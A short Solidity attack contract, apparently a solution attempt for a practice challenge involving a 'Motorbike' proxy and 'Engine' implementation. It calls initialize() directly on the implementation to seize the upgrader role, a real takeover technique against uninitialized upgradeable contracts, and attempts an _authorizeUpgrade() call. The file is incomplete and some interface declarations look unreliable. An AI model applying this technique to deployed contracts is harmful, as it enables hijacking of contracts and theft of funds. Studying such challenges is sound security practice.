// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IMotorbike {
    function _delegate(address implementation) external;
    function _getAddressSlot(bytes32 slot) external pure returns (address);
    function initialize(address _logic) external;
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function _authorizeUpgrade() external view;
    function _upgradeToAndCall(address newImplementation, bytes calldata data) external;
    function _setImplementation(address newImplementation) external;
}
contract Attack {
    IMotorbike public mot;
    IEngine public eng;

    constructor(address _add) public {
        eng = IEngine(_add);
    }

    function attack1() public {
        eng.initialize();
    }
    function attack2() public {
        eng._authorizeUpgrade();
    }
    
}